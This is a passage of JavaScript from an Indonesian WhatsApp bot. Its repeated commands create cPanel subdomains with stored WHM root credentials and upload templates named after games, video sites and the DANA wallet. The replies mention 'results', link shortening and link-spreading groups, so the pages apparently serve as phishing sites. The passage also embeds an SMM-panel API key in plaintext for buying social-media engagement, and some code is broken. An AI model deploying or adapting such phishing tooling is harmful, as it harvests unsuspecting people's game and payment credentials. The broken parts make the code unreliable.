        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/grubv9/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB
case 'dim16' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/mlbb/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim17' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/nonton/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim18' :

id = m.key.emoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/domain/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim19' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/simontok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim20' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/stumble/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim21' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/yt18/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim22' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/dana/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
        


// 5 JUNI 2023
// FITUR HOST BY DIMAS HOST
// BATAS WEB BY DIMAS HOST
case 'dim23' :

id = m.key.remoteJid
        if(validGrup(id,grups)){

        function makeid(length) {
            var result = '';
            var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            var charactersLength = characters.length;
            for (var i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() *
                    charactersLength));
            }
            return result;
        }

        //GANTI DATA LOGIN DI SINI
        host = server[0].url
        uroot = server[0].username
        proot = server[0].password
        ipanda = server[0].ip
        domain = "simontok" + makeid(7) + "." + server[0].domain


        namamu = m.chat.pushName
        idmu = m.key.participant
        reply("*_Sabar Om,Ga Lama Kok🤤_*")


        var inputt = {

            server: host,
            userwhm: uroot,
            passwhm: proot,
            ip: ipanda,
            domain: domain
        }

        request.post({
            url: 'https://api.qris-ku.biz.id/domain/createcp.php',
            form: inputt
        }, function (error, response, body) {

            function afakahinijson(str) {
                try {
                    JSON.parse(str);
                } catch (e) {
                    return false;
                }
                return true;
            }

            if (afakahinijson(body)) {
                hasil = JSON.parse(body)
                pathh = hasil.path
                user = hasil.user
                pass = hasil.pass
                domain = hasil.domain
                pendek = hasil.pendek
                // uppkg(host,uroot,proot,user,"cPanel Unlimited")
                // HAPUS SPASI GOIB
                user = user.replace(/\s+/g, '');
                pass = pass.replace(/\s+/g, '');
                
                //INI BATAS
                var inputt = {

                    server: host,
                    user: user,
                    pass: pass,
                    userwhm: uroot,
                    passwhm: proot,
                    tampilan: "mlbb",
                    path: pathh,
                }

                request.post({
                    url: 'https://api.qris-ku.biz.id/blok/upload.php',
                    form: inputt
                }, function (error, res, body) {
                     // berhasil mengupload sc
                    // hasil = JSON.parse(body)
                    // console.log(hasil.path)
                    if (afakahinijson(body)) {
                        hasil = JSON.parse(body)
                        console.log(hasil.path)
                        console.log(hasil)
                    } else {
                        reply(`_*Sukses*, Web Sudah Terkirim Ke *${pushname}*_`, idmu)
                    }


                                        hasillrndy = `Ini Web Nya Om *${pushname}*🤤
==========================
➢ Web Tanpa Shortlink :
${domain}/vhsfhqpdhdsih6
➢ Setting :
${domain}/vhsfhqpdhdsih6/host.php
*Sebelum Di Gunakan Bungkus Dulu Dengan Cara Ketik .shortlink*
➢ Grub Jasteb GG¹ :
https://chat.whatsapp.com/Gyku8sYY57I7JHrk6tpxJf
➢ Grub Jasteb GG² :
https://chat.whatsapp.com/CNGkBWYcKtvCM9i7eCTDYj
*➢ Ress Ga Masuk? Tonton!*
https://youtu.be/nQRaulTXTxA
Tunggu 1-3 Menit Agar Web Bisa Di Gunakan`

                    kirimprib(`hi ${namamu}`, idmu)
                    kirimprib(hasillrndy, idmu)
                })
            } else {
                reply("_Koneksi Terputus, Silahkan coba lagi dalam 5 Detik!_") //error ,limit username,server mati, cpu naik, domain merah/error
            }
        })
    
}else{
            reply("Grup Tidak Terdaftar Silahkan Hubungi Owner")
        }
break
case "listsewa" : {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`Hai kak👋

*_LIST SEWA BOT HARDZ OFFCIAL PAYMENT_*

○ 1 DAY : 5k
○ 3 DAY : 15k
○ 5 DAY : 25k
○ 7 DAY : 45k
○ 10 DAY : 55k
○ 14 DAY : 65k
○ 21 DAY : 75k
○ 30 DAY : 85k
○ PERMANEN : ( Pm Owner )

CARA ORDER
.sewa linkgc|1day`)
}
break
case "ceksaldo-smm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        let md5 = require('md5')
        let apikey_smm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let fetch = (...args) => import('node-fetch').then(({
          default: fetch
        }) => fetch(...args))
        let data = {
          api_key: apikey_smm,
        }
        fetch(`https://mrxpanel.com/api/profile`, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
              'Content-Type': 'application/json'
            }
          })
          .then(response => response.json())
          .then((data) => {
            anjir = `*── 「 SISA SALDO 」 ──*\n\n*_Saldo : ${data.data.balance}_*\n*_Full name : ${data.data.full_name}_*\n*_username : ${data.data.username}_*`
           Biiofc.sendMessage(from, { text: anjir }, { quoted:m})
          })
}
break;    
case "suntiksmm": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
        if (!text) return reply(`example .suntiksmm 25 https://youtube.com/shorts/z4tojQ3PmWY?feature=shared 100000`)
     let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 let apismm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
        let data = {
          api_key: apikeysmm,
          service: jumlah,
          target: targ,
          quantity: idny,
        }
        fetch('https://mrxpanel.com/api/order', {
            method: 'POST',
            body: JSON.stringify(data),
            header: {
              'Content-Type': 'application/json'
            }
          }).then((response) => response.json())
          .then((res) => {
                if (res.data.message == 'Saldo Anda tidak cukup untuk melakukan pemesanan ini.') { 
            reply(res.data.message)
            }
                    if (res.data.message == 'Pesanan berhasil, pesanan akan diproses.') {
      cap = `*──••• 「 TRANSAKSI BERHASIL 」 •••──*

ID : ${res.data.id}

*_untuk cek transaksi silahkan ketik = .cektransaksi id_*`
         rizalxdzz.sendMessage(from, { caption: cap })
}
          
}
)}
break
case "cektransaksi":
case "cektrx": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
	if (!isOwner) throw ('Khusus Owner')
    if (!text) {
        let errorMessage = '⚠️ *Format salah!*\n\nContoh :\n_cektrx 11012_*';

        return   Biiofc.sendMessage(msg.chat, {text:errorMessage})
    }
    let [refid] = text.split(" ");
    let md5 = require('md5');
    let fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
    let apikeysmm = "JrMVEQTPU0gKXRVe1fB1T3zfM"
    let data = {
          api_key: apikeysmm,
          id: refid,
    };
    let response = await fetch('https://mrxpanel.com/api/status', {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    let result = await response.json();
if (result.status == false) {
